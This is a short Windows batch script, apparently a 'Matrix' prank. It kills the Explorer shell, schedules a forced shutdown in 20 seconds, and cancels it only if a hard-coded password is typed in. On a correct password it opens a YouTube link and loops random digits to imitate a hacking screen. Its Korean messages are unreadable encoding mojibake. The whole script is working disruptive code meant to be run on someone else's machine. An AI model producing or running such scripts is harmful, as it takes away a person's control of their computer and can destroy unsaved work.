@echo off
title Matrix
color 0a

mode 1000

echo �� ������ �������� �ν����� ���� ��ŷ ���������� �����ϴ�.
echo �ٸ�, �������� �������� ������ ��Ű�ø� ���ο��� å���� ������ �ٽ��ѹ� �˷��帳�ϴ�. 

@echo off
taskkill /f /im explorer.exe
echo ��ȣ�� 20�� �ȿ� �Է����� ������ ��ǻ�Ͱ� ������

shutdown /s /t 20

set /p password=�Է�:
if %password% ==1234 goto pass
:shutdown
echo ����� Ʋ���ϴ�.. ��ǻ�Ͱ� �����ϴ�.
pause

:pass
cls
echo ���� ��ǻ�͸� ����Ҽ� �־��.
shutdown /a

start c:\windows\explorer.exe
start https://youtu.be/pF-3S-HTJSg&amp=&autoplay=1

:Matrix
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%random%random%random%random%

ping 127.0.0.1 -n 1 -w 50 > nul
goto Matrix

